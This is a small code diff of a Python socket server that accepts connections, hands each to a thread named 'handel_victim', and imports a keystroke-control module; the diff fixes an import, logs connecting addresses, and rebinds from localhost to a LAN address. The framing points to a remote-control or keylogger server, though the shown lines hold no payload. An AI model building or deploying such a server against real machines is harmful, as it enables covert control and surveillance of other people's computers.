@@ -1,7 +1,7 @@
 import socket
 import sys
 import threading
-from input_control.keystroke_control import KeyStrokes
+from ..input_control.keystroke_control import KeyStrokes
 
 
 class Server:
@@ -22,6 +22,7 @@ class Server:
         try:
             while True:
                 conn, addr = self.server.accept()
+                print('connection from:', addr)
                 thread = threading.Thread(target=self.handel_victim, args=(conn,))
                 thread.start()
         except Exception as e:
@@ -31,4 +32,4 @@ class Server:
 
 if __name__ == '__main__':
     print('SERVER IS STARTING :)')
-    Server('127.0.0.1', 1245).start()
+    Server('192.168.1.125', 1111).start()
